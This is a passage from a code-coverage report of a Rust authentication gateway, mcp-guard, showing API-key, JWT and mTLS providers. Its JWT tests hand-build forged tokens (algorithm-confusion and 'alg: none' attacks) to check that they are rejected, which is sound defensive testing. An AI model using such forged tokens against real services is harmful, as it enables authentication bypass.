  698|      1|        claims.insert("exp".to_string(), serde_json::json!(now + 3600));
  699|       |
  700|      1|        let token = create_test_token(&claims);
  701|      1|        let result = provider.authenticate(&token).await;
  702|       |        
  703|      1|        assert!(result.is_err());
  704|      1|        let err_msg = result.unwrap_err().to_string();
  705|      1|        assert!(err_msg.contains("Missing 'custom_id' claim"));
  706|      1|    }
  707|       |
  708|       |    // -------------------------------------------------------------------------
  709|       |    // Algorithm Confusion Attack Prevention Tests
  710|       |    // -------------------------------------------------------------------------
  711|       |
  712|       |    #[tokio::test]
  713|      1|    async fn test_algorithm_confusion_rs256_rejected() {
  714|       |        // Attempt to use RS256 header with HS256 secret (algorithm confusion attack)
  715|       |        // We need to manually craft the token since encode() validates algorithm/key match
  716|      1|        let provider = create_simple_provider();
  717|      1|        let now = now_secs();
  718|       |
  719|       |        // Manually build a JWT with RS256 in header but HS256 signature
  720|      1|        let header_json = r#"{"alg":"RS256","typ":"JWT"}"#;
  721|      1|        let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(header_json);
  722|       |
  723|      1|        let claims_json = format!(
  724|      1|            r#"{{"sub":"attacker","iss":"test-issuer","aud":"test-audience","exp":{}}}"#,
  725|      1|            now + 3600
  726|       |        );
  727|      1|        let claims_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&claims_json);
  728|       |
  729|       |        // Sign with HS256 using HMAC (would work if we accepted the wrong algorithm)
  730|       |        use hmac::{Hmac, Mac};
  731|       |        use sha2::Sha256;
  732|       |        type HmacSha256 = Hmac<Sha256>;
  733|       |
  734|      1|        let message = format!("{}.{}", header_b64, claims_b64);
  735|      1|        let mut mac = HmacSha256::new_from_slice(TEST_SECRET.as_bytes()).unwrap();
  736|      1|        mac.update(message.as_bytes());
  737|      1|        let signature = mac.finalize().into_bytes();
  738|      1|        let sig_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(signature);
  739|       |
  740|      1|        let token = format!("{}.{}.{}", header_b64, claims_b64, sig_b64);
  741|       |
  742|      1|        let result = provider.authenticate(&token).await;
  743|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  744|      1|        if let Err(AuthError::InvalidJwt(msg)) = result {
  745|      1|            assert!(msg.contains("Algorithm mismatch"), "Expected algorithm mismatch error, got: {}", msg);
                                                                      ^0
  746|      1|        }
                      ^0
  747|      1|    }
  748|       |
  749|       |    #[tokio::test]
  750|      1|    async fn test_algorithm_confusion_none_rejected() {
  751|       |        // The 'none' algorithm attack - try to bypass signature verification
  752|      1|        let provider = create_simple_provider();
  753|       |
  754|       |        // Manually craft a token with alg: "none"
  755|       |        // Header: {"alg":"none","typ":"JWT"}
  756|       |        // This is a well-known attack vector
  757|      1|        let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
  758|      1|            .encode(r#"{"alg":"none","typ":"JWT"}"#);
  759|      1|        let now = now_secs();
  760|      1|        let claims_json = format!(
  761|      1|            r#"{{"sub":"attacker","iss":"test-issuer","aud":"test-audience","exp":{}}}"#,
  762|      1|            now + 3600
  763|       |        );
  764|      1|        let claims_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&claims_json);
  765|       |
  766|       |        // Token with empty signature (alg: none attack)
  767|      1|        let token = format!("{}.{}.", header_b64, claims_b64);
  768|       |
  769|      1|        let result = provider.authenticate(&token).await;
  770|       |        // Should fail - either algorithm mismatch or invalid JWT
  771|      1|        assert!(result.is_err());
  772|      1|    }
  773|       |
  774|       |    #[tokio::test]
  775|      1|    async fn test_algorithm_confusion_es256_rejected() {
  776|       |        // Attempt to use ES256 header with HS256 provider
  777|       |        // We need to manually craft the token since encode() validates algorithm/key match
  778|      1|        let provider = create_simple_provider();
  779|      1|        let now = now_secs();
  780|       |
  781|       |        // Manually build a JWT with ES256 in header but fake signature
  782|      1|        let header_json = r#"{"alg":"ES256","typ":"JWT"}"#;
  783|      1|        let header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(header_json);
  784|       |
  785|      1|        let claims_json = format!(
  786|      1|            r#"{{"sub":"attacker","iss":"test-issuer","aud":"test-audience","exp":{}}}"#,
  787|      1|            now + 3600
  788|       |        );
  789|      1|        let claims_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&claims_json);
  790|       |
  791|       |        // Use HMAC signature (the attack would be to use the HMAC secret as the "public key")
  792|       |        use hmac::{Hmac, Mac};
  793|       |        use sha2::Sha256;
  794|       |        type HmacSha256 = Hmac<Sha256>;
  795|       |
  796|      1|        let message = format!("{}.{}", header_b64, claims_b64);
  797|      1|        let mut mac = HmacSha256::new_from_slice(TEST_SECRET.as_bytes()).unwrap();
  798|      1|        mac.update(message.as_bytes());
  799|      1|        let signature = mac.finalize().into_bytes();
  800|      1|        let sig_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(signature);
  801|       |
  802|      1|        let token = format!("{}.{}.{}", header_b64, claims_b64, sig_b64);
  803|       |
  804|      1|        let result = provider.authenticate(&token).await;
  805|      1|        assert!(matches!(result, Err(AuthError::InvalidJwt(_))));
                              ^0
  806|      1|        if let Err(AuthError::InvalidJwt(msg)) = result {
  807|      1|            assert!(msg.contains("Algorithm mismatch"), "Expected algorithm mismatch error, got: {}", msg);
                                                                      ^0
  808|      1|        }
                      ^0
  809|      1|    }
  810|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/auth/mod.rs:
    1|       |//! Authentication providers for mcp-guard
    2|       |//!
    3|       |//! This module provides pluggable authentication for MCP requests:
    4|       |//! - API Key: Simple hash-based key validation
    5|       |//! - JWT: HS256 (simple) or RS256/ES256 (JWKS) token validation
    6|       |//! - OAuth 2.1: Token introspection and userinfo validation with PKCE
    7|       |//! - mTLS: Client certificate authentication via reverse proxy headers
    8|       |//!
    9|       |//! All providers implement the [`AuthProvider`] trait, allowing them to be
   10|       |//! combined via [`MultiProvider`] for fallback authentication.
   11|       |
   12|       |mod jwt;
   13|       |mod mtls;
   14|       |mod oauth;
   15|       |
   16|       |pub use jwt::JwtProvider;
   17|       |pub use mtls::{ClientCertInfo, MtlsAuthProvider, HEADER_CLIENT_CERT_CN, HEADER_CLIENT_CERT_VERIFIED};
   18|       |pub use oauth::OAuthAuthProvider;
   19|       |
   20|       |use async_trait::async_trait;
   21|       |use std::collections::HashMap;
   22|       |use std::sync::Arc;
   23|       |
   24|       |// ============================================================================
   25|       |// Error Types
   26|       |// ============================================================================
   27|       |
   28|       |/// Authentication error type
   29|       |#[derive(Debug, thiserror::Error)]
   30|       |pub enum AuthError {
   31|       |    #[error("Missing authentication credentials")]
   32|       |    MissingCredentials,
   33|       |
   34|       |    #[error("Invalid API key")]
   35|       |    InvalidApiKey,
   36|       |
   37|       |    #[error("Invalid JWT: {0}")]
   38|       |    InvalidJwt(String),
   39|       |
   40|       |    #[error("Token expired")]
   41|       |    TokenExpired,
   42|       |
   43|       |    #[error("OAuth error: {0}")]
   44|       |    OAuth(String),
   45|       |
   46|       |    #[error("Invalid client certificate: {0}")]
   47|       |    InvalidClientCert(String),
   48|       |
   49|       |    #[error("Internal error: {0}")]
   50|       |    Internal(String),
   51|       |}
   52|       |
   53|       |// ============================================================================
   54|       |// Types
   55|       |// ============================================================================
   56|       |
   57|       |/// Authenticated identity representing a user or service that has been verified
   58|       |#[derive(Debug, Clone)]
   59|       |pub struct Identity {
   60|       |    /// Unique identifier for the user/service
   61|       |    pub id: String,
   62|       |
   63|       |    /// Display name
   64|       |    pub name: Option<String>,
   65|       |
   66|       |    /// Allowed tools (None means all allowed)
   67|       |    pub allowed_tools: Option<Vec<String>>,
   68|       |
   69|       |    /// Custom rate limit for this identity
   70|       |    pub rate_limit: Option<u32>,
   71|       |
   72|       |    /// Additional claims/metadata from the authentication token
   73|       |    pub claims: std::collections::HashMap<String, serde_json::Value>,
   74|       |}
   75|       |
   76|       |// ============================================================================
   77|       |// Utility Functions
   78|       |// ============================================================================
   79|       |
   80|       |/// Map OAuth/JWT scopes to allowed tools based on a scope-to-tool mapping
   81|       |///
   82|       |/// # Arguments
   83|       |/// * `scopes` - List of scopes from the token
   84|       |/// * `scope_tool_mapping` - Mapping from scope names to tool names
   85|       |///
   86|       |/// # Returns
   87|       |/// * `None` - No restrictions (empty mapping or wildcard "*" scope)
   88|       |/// * `Some(vec![])` - No tools allowed (scopes not in mapping)
   89|       |/// * `Some(tools)` - Specific tools allowed
   90|     24|pub fn map_scopes_to_tools(
   91|     24|    scopes: &[String],
   92|     24|    scope_tool_mapping: &HashMap<String, Vec<String>>,
   93|     24|) -> Option<Vec<String>> {
   94|     24|    if scope_tool_mapping.is_empty() {
   95|     15|        return None; // No mapping = all tools allowed
   96|      9|    }
   97|       |
   98|      9|    let mut tools = Vec::new();
   99|     18|    for scope in scopes {
                      ^13
  100|     13|        if let Some(scope_tools) = scope_tool_mapping.get(scope) {
                                  ^12
  101|     12|            if scope_tools.contains(&"*".to_string()) {
  102|      4|                return None; // Wildcard = all tools
  103|      8|            }
  104|      8|            tools.extend(scope_tools.iter().cloned());
  105|      1|        }
  106|       |    }
  107|       |
  108|      5|    if tools.is_empty() {
  109|      1|        Some(vec![]) // Empty = no tools allowed (scope not in mapping)
  110|       |    } else {
  111|      4|        tools.sort();
  112|      4|        tools.dedup();
  113|      4|        Some(tools)
  114|       |    }
  115|     24|}
  116|       |
  117|       |// ============================================================================
  118|       |// Traits
  119|       |// ============================================================================
  120|       |
  121|       |/// Authentication provider trait
  122|       |#[async_trait]
  123|       |pub trait AuthProvider: Send + Sync {
  124|       |    /// Authenticate a request and return the identity
  125|       |    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError>;
  126|       |
  127|       |    /// Provider name for logging and metrics
  128|       |    fn name(&self) -> &str;
  129|       |}
  130|       |
  131|       |// ============================================================================
  132|       |// Providers
  133|       |// ============================================================================
  134|       |
  135|       |/// API key authentication provider
  136|       |///
  137|       |/// Validates requests using pre-shared API keys. Keys are stored as SHA-256
  138|       |/// hashes to prevent exposure of plaintext keys in configuration.
  139|       |///
  140|       |/// SECURITY: Uses constant-time comparison to prevent timing attacks.
  141|       |pub struct ApiKeyProvider {
  142|       |    keys: Vec<crate::config::ApiKeyConfig>,
  143|       |}
  144|       |
  145|       |impl ApiKeyProvider {
  146|     18|    pub fn new(configs: Vec<crate::config::ApiKeyConfig>) -> Self {
  147|     18|        Self { keys: configs }
  148|     18|    }
  149|       |
  150|     11|    fn hash_key(key: &str) -> String {
  151|       |        use sha2::{Digest, Sha256};
  152|     11|        let mut hasher = Sha256::new();
  153|     11|        hasher.update(key.as_bytes());
  154|     11|        base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
  155|     11|    }
  156|       |
  157|       |    /// Constant-time comparison of two hash strings.
  158|       |    ///
  159|       |    /// SECURITY: Prevents timing attacks by ensuring comparison takes the same
  160|       |    /// amount of time regardless of where the hashes differ.
  161|     16|    fn constant_time_compare(a: &str, b: &str) -> bool {
  162|       |        use subtle::ConstantTimeEq;
  163|       |
  164|       |        // First, compare lengths in constant time
  165|     16|        let len_eq = a.len().ct_eq(&b.len());
  166|       |
  167|       |        // If lengths match, compare bytes in constant time
  168|       |        // If lengths differ, still compare to maintain constant time
  169|     16|        let bytes_eq = if a.len() == b.len() {
  170|     13|            a.as_bytes().ct_eq(b.as_bytes())
  171|       |        } else {
  172|       |            // Compare with dummy to maintain timing
  173|      3|            let dummy = vec![0u8; a.len()];
  174|      3|            a.as_bytes().ct_eq(&dummy)
  175|       |        };
  176|       |
  177|       |        // Both length and content must match
  178|     16|        (len_eq & bytes_eq).into()
  179|     16|    }
  180|       |}
  181|       |
  182|       |#[async_trait]
  183|       |impl AuthProvider for ApiKeyProvider {
  184|      9|    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError> {
  185|       |        let provided_hash = Self::hash_key(token);
  186|       |
  187|       |        // SECURITY: Iterate through ALL keys to prevent timing-based enumeration.
  188|       |        // The loop always runs for the same number of iterations regardless of
  189|       |        // which key matches (or if any matches at all).
  190|       |        let mut matched_config: Option<&crate::config::ApiKeyConfig> = None;
  191|       |
  192|       |        for config in &self.keys {
  193|       |            if Self::constant_time_compare(&provided_hash, &config.key_hash) {
  194|       |                matched_config = Some(config);
  195|       |                // Don't break - continue iterating to maintain constant time
  196|       |            }
  197|       |        }
  198|       |
  199|       |        matched_config
  200|       |            .map(|config| Identity {
  201|      4|                id: config.id.clone(),
  202|      4|                name: Some(config.id.clone()),
  203|      4|                allowed_tools: if config.allowed_tools.is_empty() {
  204|      2|                    None
  205|       |                } else {
  206|      2|                    Some(config.allowed_tools.clone())
  207|       |                },
  208|      4|                rate_limit: config.rate_limit,
  209|      4|                claims: std::collections::HashMap::new(),
  210|      4|            })
  211|       |            .ok_or(AuthError::InvalidApiKey)
  212|      9|    }
  213|       |
  214|      0|    fn name(&self) -> &str {
  215|      0|        "api_key"
  216|      0|    }
  217|       |}
  218|       |
  219|       |/// Combined authentication provider that tries multiple providers in sequence
  220|       |///
  221|       |/// Attempts authentication against each configured provider until one succeeds.
  222|       |/// Returns the most informative error if all providers fail (e.g., prefers
  223|       |/// "token expired" over "invalid API key").
  224|       |pub struct MultiProvider {
  225|       |    /// List of providers to try, in order of precedence
  226|       |    providers: Vec<Arc<dyn AuthProvider>>,
  227|       |}
  228|       |
  229|       |impl MultiProvider {
  230|      1|    pub fn new(providers: Vec<Arc<dyn AuthProvider>>) -> Self {
  231|      1|        Self { providers }
  232|      1|    }
  233|       |}
  234|       |
  235|       |#[async_trait]
  236|       |impl AuthProvider for MultiProvider {
  237|      3|    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError> {
  238|       |        if self.providers.is_empty() {
  239|       |            return Err(AuthError::MissingCredentials);
  240|       |        }
  241|       |
  242|       |        let mut last_error: Option<AuthError> = None;
  243|       |
  244|       |        for provider in &self.providers {
  245|       |            match provider.authenticate(token).await {
  246|       |                Ok(identity) => return Ok(identity),
  247|       |                Err(e) => {
  248|       |                    // Prioritize more informative errors
  249|       |                    let should_replace = match (&last_error, &e) {
  250|       |                        (None, _) => true,
  251|       |                        // Token expired is more specific than generic errors
  252|       |                        (Some(AuthError::InvalidApiKey), AuthError::TokenExpired) => true,
  253|       |                        (Some(AuthError::InvalidApiKey), AuthError::InvalidJwt(_)) => true,
  254|       |                        (Some(AuthError::InvalidApiKey), AuthError::OAuth(_)) => true,
  255|       |                        (Some(AuthError::MissingCredentials), _) => true,
  256|       |                        // Keep the current error in other cases
  257|       |                        _ => false,
  258|       |                    };
  259|       |
  260|       |                    if should_replace {
  261|       |                        last_error = Some(e);
  262|       |                    }
  263|       |                }
  264|       |            }
  265|       |        }
  266|       |
  267|       |        Err(last_error.unwrap_or(AuthError::MissingCredentials))
  268|      3|    }
  269|       |
  270|      0|    fn name(&self) -> &str {
  271|      0|        "multi"
  272|      0|    }
  273|       |}
  274|       |
  275|       |#[cfg(test)]
  276|       |mod tests {
  277|       |    use super::*;
  278|       |
  279|       |    #[test]
  280|      1|    fn test_constant_time_compare_equal() {
  281|      1|        let a = "abc123XYZ";
  282|      1|        let b = "abc123XYZ";
  283|      1|        assert!(ApiKeyProvider::constant_time_compare(a, b));
  284|      1|    }
  285|       |
  286|       |    #[test]
  287|      1|    fn test_constant_time_compare_different_content() {
  288|      1|        let a = "abc123XYZ";
  289|      1|        let b = "abc123XYy";  // Last char different
  290|      1|        assert!(!ApiKeyProvider::constant_time_compare(a, b));
  291|      1|    }
  292|       |
  293|       |    #[test]
  294|      1|    fn test_constant_time_compare_different_length() {
  295|      1|        let a = "abc123";
  296|      1|        let b = "abc123XYZ";
  297|      1|        assert!(!ApiKeyProvider::constant_time_compare(a, b));
  298|      1|    }
  299|       |
  300|       |    #[test]
  301|      1|    fn test_constant_time_compare_empty() {
  302|      1|        assert!(ApiKeyProvider::constant_time_compare("", ""));
  303|      1|        assert!(!ApiKeyProvider::constant_time_compare("", "a"));
  304|      1|        assert!(!ApiKeyProvider::constant_time_compare("a", ""));
  305|      1|    }
  306|       |
  307|       |    #[test]
  308|      1|    fn test_constant_time_compare_first_char_different() {
  309|      1|        let a = "Xbc123XYZ";
  310|      1|        let b = "abc123XYZ";
  311|      1|        assert!(!ApiKeyProvider::constant_time_compare(a, b));
  312|      1|    }
  313|       |
  314|       |    #[tokio::test]
  315|      1|    async fn test_api_key_provider_valid_key() {
  316|      1|        let key = "test-api-key-12345";
  317|      1|        let hash = ApiKeyProvider::hash_key(key);
  318|       |
  319|      1|        let config = crate::config::ApiKeyConfig {
  320|      1|            id: "test-user".to_string(),
  321|      1|            key_hash: hash,
  322|      1|            allowed_tools: vec!["read".to_string()],
  323|      1|            rate_limit: Some(100),
  324|      1|        };
  325|       |
  326|      1|        let provider = ApiKeyProvider::new(vec![config]);
  327|      1|        let result = provider.authenticate(key).await;
  328|       |
  329|      1|        assert!(result.is_ok());
  330|      1|        let identity = result.unwrap();
  331|      1|        assert_eq!(identity.id, "test-user");
  332|      1|        assert_eq!(identity.allowed_tools, Some(vec!["read".to_string()]));
  333|      1|    }
  334|       |
  335|       |    #[tokio::test]
  336|      1|    async fn test_api_key_provider_invalid_key() {
  337|      1|        let valid_key = "valid-key";
  338|      1|        let hash = ApiKeyProvider::hash_key(valid_key);
  339|       |
  340|      1|        let config = crate::config::ApiKeyConfig {
  341|      1|            id: "test-user".to_string(),
  342|      1|            key_hash: hash,
  343|      1|            allowed_tools: vec![],
  344|      1|            rate_limit: None,
  345|      1|        };
  346|       |
  347|      1|        let provider = ApiKeyProvider::new(vec![config]);
  348|      1|        let result = provider.authenticate("wrong-key").await;
  349|       |
  350|      1|        assert!(matches!(result, Err(AuthError::InvalidApiKey)));
                              ^0
  351|      1|    }
  352|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/auth/mtls.rs:
    1|       |//! mTLS client certificate authentication provider
    2|       |//!
    3|       |//! This provider extracts identity from client certificates, supporting two modes:
    4|       |//! 1. Header-based: When TLS is terminated at a reverse proxy (nginx, HAProxy) that
    5|       |//!    forwards client certificate info in headers (X-Client-Cert-CN, X-Client-Cert-SAN)
    6|       |//! 2. Native: When using axum-server with rustls (requires additional setup)
    7|       |//!
    8|       |//! Common deployment pattern:
    9|       |//! - Load balancer terminates mTLS and validates client certificates
   10|       |//! - Load balancer forwards certificate info in HTTP headers
   11|       |//! - mcp-guard extracts identity from headers
   12|       |//!
   13|       |//! SECURITY: When using header-based mTLS, you MUST configure `trusted_proxy_ips`
   14|       |//! to prevent header spoofing attacks. Only requests from trusted proxy IPs will
   15|       |//! have their mTLS headers honored.
   16|       |
   17|       |use async_trait::async_trait;
   18|       |use std::collections::HashMap;
   19|       |use std::net::IpAddr;
   20|       |
   21|       |use crate::auth::{AuthError, AuthProvider, Identity};
   22|       |use crate::config::{MtlsConfig, MtlsIdentitySource};
   23|       |
   24|       |/// Header names for client certificate info (from reverse proxy)
   25|       |pub const HEADER_CLIENT_CERT_CN: &str = "X-Client-Cert-CN";
   26|       |pub const HEADER_CLIENT_CERT_SAN_DNS: &str = "X-Client-Cert-SAN-DNS";
   27|       |pub const HEADER_CLIENT_CERT_SAN_EMAIL: &str = "X-Client-Cert-SAN-Email";
   28|       |pub const HEADER_CLIENT_CERT_VERIFIED: &str = "X-Client-Cert-Verified";
   29|       |
   30|       |/// Trusted proxy IP validator
   31|       |///
   32|       |/// Validates that incoming requests with mTLS headers come from trusted proxy IPs.
   33|       |/// This prevents header spoofing attacks where an attacker directly connects to
   34|       |/// the server and sets fake mTLS headers.
   35|       |#[derive(Debug, Clone)]
   36|       |pub struct TrustedProxyValidator {
   37|       |    /// List of trusted IP addresses and CIDR ranges
   38|       |    trusted_ranges: Vec<TrustedRange>,
   39|       |}
   40|       |
   41|       |/// A trusted IP range (either single IP or CIDR block)
   42|       |#[derive(Debug, Clone)]
   43|       |enum TrustedRange {
   44|       |    Single(IpAddr),
   45|       |    Cidr { network: IpAddr, prefix_len: u8 },
   46|       |}
   47|       |
   48|       |impl TrustedProxyValidator {
   49|       |    /// Create a new validator from a list of IP/CIDR strings
   50|       |    ///
   51|       |    /// Accepts formats:
   52|       |    /// - Single IP: "192.168.1.1", "::1"
   53|       |    /// - CIDR: "10.0.0.0/8", "fd00::/8"
   54|     13|    pub fn new(trusted_ips: &[String]) -> Self {
   55|     13|        let trusted_ranges = trusted_ips
   56|     13|            .iter()
   57|     13|            .filter_map(|s| Self::parse_range(s))
                                          ^9                ^9
   58|     13|            .collect();
   59|       |
   60|     13|        Self { trusted_ranges }
   61|     13|    }
   62|       |
   63|       |    /// Parse an IP or CIDR range string
   64|      9|    fn parse_range(s: &str) -> Option<TrustedRange> {
   65|      9|        let s = s.trim();
   66|       |
   67|      9|        if let Some((ip_str, prefix_str)) = s.split_once('/') {
                                   ^3      ^3
   68|       |            // CIDR format
   69|      3|            let network: IpAddr = ip_str.parse().ok()?;
                                                                   ^0
   70|      3|            let prefix_len: u8 = prefix_str.parse().ok()?;
                                                                      ^0
   71|       |
   72|       |            // Validate prefix length
   73|      3|            let max_prefix = match network {
   74|      2|                IpAddr::V4(_) => 32,
   75|      1|                IpAddr::V6(_) => 128,
   76|       |            };
   77|      3|            if prefix_len > max_prefix {
   78|      0|                return None;
   79|      3|            }
   80|       |
   81|      3|            Some(TrustedRange::Cidr { network, prefix_len })
   82|       |        } else {
   83|       |            // Single IP
   84|      6|            let ip: IpAddr = s.parse().ok()?;
                                                         ^0
   85|      6|            Some(TrustedRange::Single(ip))
   86|       |        }
   87|      9|    }
   88|       |
   89|       |    /// Check if an IP address is trusted
   90|     19|    pub fn is_trusted(&self, ip: &IpAddr) -> bool {
   91|     19|        if self.trusted_ranges.is_empty() {
   92|       |            // No trusted ranges configured = no IPs are trusted
   93|      4|            return false;
   94|     15|        }
   95|       |
   96|     30|        for range in &self.trusted_ranges {
                          ^24
   97|     24|            match range {
   98|     12|                TrustedRange::Single(trusted_ip) => {
   99|     12|                    if ip == trusted_ip {
  100|      4|                        return true;
  101|      8|                    }
  102|       |                }
  103|     12|                TrustedRange::Cidr { network, prefix_len } => {
  104|     12|                    if Self::ip_in_cidr(ip, network, *prefix_len) {
  105|      5|                        return true;
  106|      7|                    }
  107|       |                }
  108|       |            }
  109|       |        }
  110|       |
  111|      6|        false
  112|     19|    }
  113|       |
  114|       |    /// Check if an IP address is within a CIDR range
  115|     12|    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
  116|     12|        match (ip, network) {
  117|     10|            (IpAddr::V4(ip), IpAddr::V4(net)) => {
  118|     10|                let ip_bits = u32::from_be_bytes(ip.octets());
  119|     10|                let net_bits = u32::from_be_bytes(net.octets());
  120|     10|                let mask = if prefix_len == 0 {
  121|      0|                    0
  122|       |                } else {
  123|     10|                    !0u32 << (32 - prefix_len)
  124|       |                };
  125|     10|                (ip_bits & mask) == (net_bits & mask)
  126|       |            }
  127|      2|            (IpAddr::V6(ip), IpAddr::V6(net)) => {
  128|      2|                let ip_bits = u128::from_be_bytes(ip.octets());
  129|      2|                let net_bits = u128::from_be_bytes(net.octets());
  130|      2|                let mask = if prefix_len == 0 {
  131|      0|                    0
  132|       |                } else {
  133|      2|                    !0u128 << (128 - prefix_len)
  134|       |                };
  135|      2|                (ip_bits & mask) == (net_bits & mask)
  136|       |            }
  137|      0|            _ => false, // IPv4 and IPv6 don't match
  138|       |        }
  139|     12|    }
  140|       |
  141|       |    /// Check if the validator has any trusted ranges configured
  142|     11|    pub fn has_trusted_ranges(&self) -> bool {
  143|     11|        !self.trusted_ranges.is_empty()
  144|     11|    }
  145|       |}
  146|       |
  147|       |/// mTLS authentication provider
  148|       |///
  149|       |/// Extracts identity from client certificates that have been validated
  150|       |/// at the TLS layer (either by this server or a reverse proxy).
  151|       |///
  152|       |/// SECURITY: When using header-based mTLS, configure `trusted_proxy_ips` in the
  153|       |/// config to prevent header spoofing. Without this, mTLS header auth is disabled.
  154|       |pub struct MtlsAuthProvider {
  155|       |    config: MtlsConfig,
  156|       |    proxy_validator: TrustedProxyValidator,
  157|       |}
  158|       |
  159|       |impl MtlsAuthProvider {
  160|       |    /// Create a new mTLS auth provider
  161|      9|    pub fn new(config: MtlsConfig) -> Self {
  162|      9|        let proxy_validator = TrustedProxyValidator::new(&config.trusted_proxy_ips);
  163|       |
  164|      9|        if config.enabled && !proxy_validator.has_trusted_ranges() {
                                           ^8
  165|      5|            tracing::warn!(
  166|      0|                "mTLS authentication enabled but no trusted_proxy_ips configured. \
  167|      0|                 mTLS header authentication will be DISABLED to prevent header spoofing. \
  168|      0|                 Configure trusted_proxy_ips with your reverse proxy IPs."
  169|       |            );
  170|      4|        }
  171|       |
  172|      9|        Self {
  173|      9|            config,
  174|      9|            proxy_validator,
  175|      9|        }
  176|      9|    }
  177|       |
  178|       |    /// Check if a client IP is trusted to set mTLS headers
  179|      3|    pub fn is_trusted_proxy(&self, client_ip: &IpAddr) -> bool {
  180|      3|        self.proxy_validator.is_trusted(client_ip)
  181|      3|    }
  182|       |
  183|       |    /// Check if the provider has trusted proxies configured
  184|      3|    pub fn has_trusted_proxies(&self) -> bool {
  185|      3|        self.proxy_validator.has_trusted_ranges()
  186|      3|    }
  187|       |
  188|       |    /// Extract identity from client certificate info
  189|       |    ///
  190|       |    /// The `cert_info` contains certificate details that were extracted from
  191|       |    /// either TLS connection state or HTTP headers (from reverse proxy).
  192|      4|    pub fn extract_identity(&self, cert_info: &ClientCertInfo) -> Result<Identity, AuthError> {
  193|       |        // Extract identity based on configured source
  194|      4|        let id = match self.config.identity_source {
                          ^3
  195|      3|            MtlsIdentitySource::Cn => cert_info
  196|      3|                .common_name
  197|      3|                .clone()
  198|      3|                .ok_or_else(|| AuthError::Internal("No CN in client certificate".into()))?,
                                                                 ^1                            ^1      ^1
  199|      1|            MtlsIdentitySource::SanDns => cert_info
  200|      1|                .san_dns
  201|      1|                .first()
  202|      1|                .cloned()
  203|      1|                .ok_or_else(|| AuthError::Internal("No DNS SAN in client certificate".into()))?,
                                                                 ^0                                 ^0      ^0
  204|      0|            MtlsIdentitySource::SanEmail => cert_info
  205|      0|                .san_email
  206|      0|                .first()
  207|      0|                .cloned()
  208|      0|                .ok_or_else(|| AuthError::Internal("No Email SAN in client certificate".into()))?,
  209|       |        };
  210|       |
  211|      3|        let allowed_tools = if self.config.allowed_tools.is_empty() {
  212|      2|            None
  213|       |        } else {
  214|      1|            Some(self.config.allowed_tools.clone())
  215|       |        };
  216|       |
  217|      3|        let mut claims = HashMap::new();
  218|      3|        claims.insert(
  219|      3|            "auth_method".to_string(),
  220|      3|            serde_json::Value::String("mtls".to_string()),
  221|       |        );
  222|      3|        if let Some(ref cn) = cert_info.common_name {
  223|      3|            claims.insert("cn".to_string(), serde_json::Value::String(cn.clone()));
  224|      3|        }
                      ^0
  225|       |
  226|      3|        Ok(Identity {
  227|      3|            id,
  228|      3|            name: cert_info.common_name.clone(),
  229|      3|            allowed_tools,
  230|      3|            rate_limit: self.config.rate_limit,
  231|      3|            claims,
  232|      3|        })
  233|      4|    }
  234|       |}
  235|       |
  236|       |#[async_trait]
  237|       |impl AuthProvider for MtlsAuthProvider {
  238|       |    /// Authenticate using client certificate
  239|       |    ///
  240|       |    /// Note: For mTLS, the "token" parameter is expected to be the CN from
  241|       |    /// the client certificate header (X-Client-Cert-CN). For full cert info,
  242|       |    /// use `extract_identity` directly with `ClientCertInfo`.
  243|      2|    async fn authenticate(&self, token: &str) -> Result<Identity, AuthError> {
  244|       |        // When called via the AuthProvider trait, we only have the token
  245|       |        // which should contain the CN from the header
  246|       |        if token.is_empty() {
  247|       |            return Err(AuthError::MissingCredentials);
  248|       |        }
  249|       |
  250|       |        // Create minimal cert info from the CN
  251|       |        let cert_info = ClientCertInfo {
  252|       |            common_name: Some(token.to_string()),
  253|       |            san_dns: vec![],
  254|       |            san_email: vec![],
  255|       |            verified: true,
  256|       |        };
  257|       |
  258|       |        self.extract_identity(&cert_info)
  259|      2|    }
  260|       |
  261|      1|    fn name(&self) -> &str {
  262|      1|        "mtls"
  263|      1|    }
  264|       |}
  265|       |
  266|       |/// Client certificate information extracted from TLS connection or headers
  267|       |#[derive(Debug, Clone, Default)]
  268|       |pub struct ClientCertInfo {
  269|       |    /// Common Name (CN) from certificate subject
  270|       |    pub common_name: Option<String>,
  271|       |    /// DNS names from Subject Alternative Name (SAN) extension
  272|       |    pub san_dns: Vec<String>,
  273|       |    /// Email addresses from Subject Alternative Name (SAN) extension
  274|       |    pub san_email: Vec<String>,
  275|       |    /// Whether the certificate was verified
  276|       |    pub verified: bool,
  277|       |}
  278|       |
  279|       |impl ClientCertInfo {
  280|       |    /// Create ClientCertInfo from HTTP headers with trusted proxy validation
  281|       |    ///
  282|       |    /// SECURITY: This validates that the client IP is from a trusted proxy before
  283|       |    /// accepting the mTLS headers. If the client IP is not trusted, returns None.
  284|       |    ///
  285|       |    /// Headers expected:
  286|       |    /// - X-Client-Cert-CN: Common Name from certificate
  287|       |    /// - X-Client-Cert-SAN-DNS: Comma-separated DNS SANs
  288|       |    /// - X-Client-Cert-SAN-Email: Comma-separated email SANs
  289|       |    /// - X-Client-Cert-Verified: "SUCCESS" if verified
  290|      3|    pub fn from_headers_if_trusted(
  291|      3|        headers: &axum::http::HeaderMap,
  292|      3|        client_ip: &IpAddr,
  293|      3|        mtls_provider: &MtlsAuthProvider,
  294|      3|    ) -> Option<Self> {
  295|       |        // SECURITY: Only accept mTLS headers from trusted proxy IPs
  296|      3|        if !mtls_provider.is_trusted_proxy(client_ip) {
  297|      2|            if mtls_provider.has_trusted_proxies() {
  298|      1|                tracing::warn!(
  299|       |                    client_ip = %client_ip,
